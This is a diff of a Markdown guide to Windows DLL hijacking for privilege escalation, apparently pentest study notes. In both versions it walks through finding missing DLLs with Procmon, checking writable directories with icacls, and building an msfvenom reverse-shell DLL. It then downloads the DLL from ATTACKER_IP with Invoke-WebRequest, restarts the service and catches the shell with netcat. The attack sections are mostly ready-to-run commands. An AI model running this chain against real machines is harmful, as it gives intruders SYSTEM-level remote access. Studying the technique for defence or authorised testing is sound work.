@@ -1,107 +1,171 @@
-**DLL Hijacking** is a technique that exploits how Windows applications load Dynamic Link Libraries (DLLs). If an application or service loads a DLL without specifying a full path, and a low-privileged user can write to the directory where the application searches first, an attacker can place a malicious DLL with the same name. When the application runs (especially with elevated privileges), it loads the attacker's DLL, leading to code execution with the same privileges.
+**DLL Hijacking** abuses how Windows resolves Dynamic Link Libraries when an application does not specify a full path. If an attacker can control a directory that appears early in the DLL search order, they can place a malicious DLL that will be loaded instead of the legitimate one.
+
+When the vulnerable application runs with elevated privileges, the injected DLL executes with the same privileges, leading to privilege escalation.
 
 > A **DLL (Dynamic Link Library)** is a file that contains code and data used by multiple programs in Windows. Instead of duplicating functions across applications, DLLs allow programs to share common functionality making software more modular and efficient.
 
 ---
 
-## 1. Identify a Vulnerable Application or Service
+## DLL Search Order and Attack Surface
 
-Look for applications or services that:
+Windows resolves DLLs using a predefined order. The most relevant positions for exploitation are:
 
-- Run with elevated privileges (e.g., SYSTEM)
-- Load DLLs from writable directories
-- Do not use full paths when loading DLLs
+1. Application directory
+    
+2. System directories
+    
+3. Windows directory
+    
+4. Current directory
+    
+5. PATH directories
+    
 
-Use tools like **Process Monitor (Procmon)** to detect DLL load attempts:
-
-```text
-Filter:
-  Operation is CreateFile
-  Path ends with .dll
-  Result is NAME NOT FOUND
-```
-
-Look for missing DLLs in writable paths like:
-
-```
-C:\Program Files\VulnApp\
-C:\Users\Public\
-```
+The critical point is that the **application directory is checked first**. If a DLL is missing there, Windows continues searching elsewhere, creating an opportunity to inject a malicious DLL.
 
 ---
 
-## 2. Check Write Permissions
+## Identifying Vulnerable Applications
 
-Verify that your user can write to the target directory.
+### Enumerating Installed Software
+
+Focus on third-party applications:
 
 ```powershell
-icacls "C:\Program Files\VulnApp"
+Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
 ```
 
-Look for permissions like:
+Also check 32-bit programs:
 
-```
-BUILTIN\Users:(I)(M)
+```powershell
+Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
 ```
 
-This means users can **modify** files in the directory.
+Applications installed in custom directories are more likely to be misconfigured.
+
+
+### Detecting Missing DLLs with Procmon (Requires Administrattive Privilege)
+
+Process Monitor is commonly used to identify missing DLLs.
+
+Filter configuration:
+
+- Process Name → target application
+    
+- Operation → CreateFile
+    
+- Path → ends with `.dll`
+    
+- Result → NAME NOT FOUND
+    
+
+Example output:
+
+```text
+CreateFile   C:\Program Files\App\missing.dll   NAME NOT FOUND
+```
+
+This indicates the application attempted to load a DLL that does not exist.
+
 
 ---
-## 3. Create a Malicious DLL Payload
 
-Use `msfvenom` to generate a reverse shell DLL.
+## Verifying Write Permissions
+
+Check if the target directory is writable:
+
+```powershell
+icacls "C:\Program Files\App\"
+```
+
+Vulnerable example:
+
+```text
+BUILTIN\Users:(M)
+```
+
+Modify permissions allow:
+
+- Creating files
+    
+- Overwriting files
+    
+- Deleting files
+    
+
+This is sufficient for DLL hijacking.
+
+---
+
+## Creating a Malicious DLL (msfvenom)
+
+Generate a reverse shell DLL:
 
 ```bash
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=YOUR_PORT -f dll -o evil.dll
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=YOUR_PORT -f dll -o shell.dll
 ```
+
+This DLL will connect back to your machine when loaded.
 
 ---
 
-## 4. Rename the DLL to Match the Missing One
+## Matching the Target DLL Name
 
-If Procmon showed the application was looking for `example.dll`, rename your payload:
+Rename the payload to match the missing DLL:
 
 ```bash
-mv evil.dll example.dll
+mv shell.dll missing.dll
 ```
+
+The name must match exactly what the application is trying to load.
 
 ---
 
-## 5. **Transfer the DLL to the Target Directory
+## Transferring the DLL
 
-Use a file transfer method like Python HTTP server:
+Start a web server:
 
 ```bash
 python3 -m http.server 8080
 ```
 
-On Windows:
+Download the DLL on the target:
 
 ```powershell
-Invoke-WebRequest -Uri "http://ATTACKER_IP:8080/example.dll" -OutFile "C:\Program Files\VulnApp\example.dll"
+iwr -uri http://ATTACKER_IP:8080/missing.dll -OutFile "C:\Program Files\App\missing.dll"
 ```
+
+Place it in the application directory (first in search order).
 
 ---
 
-## 6. **Trigger the Application or Service
+## Triggering Execution
 
-Start or restart the vulnerable application or service so it loads your malicious DLL.
+The DLL executes only when the application is launched.
+
+If it is a service:
 
 ```powershell
-# If it's a service
-Restart-Service -Name "VulnAppService"
+net stop "VulnService"
+net start "VulnService"
 ```
 
-Or manually launch the application if it's user-triggered.
+If it is a normal application:
+
+```powershell
+Start-Process "C:\Program Files\App\app.exe"
+```
+
+If you cannot trigger it, wait for a privileged user.
 
 ---
 
-## 7. Catch the Reverse Shell
+## Catching the Shell
 
-On Kali, start your listener:
+Start a listener:
 
 ```bash
 nc -lvnp YOUR_PORT
 ```
 
-Once the DLL is loaded, you should receive a shell with the privileges of the application (often SYSTEM).
+Once the DLL is loaded, you receive a shell.
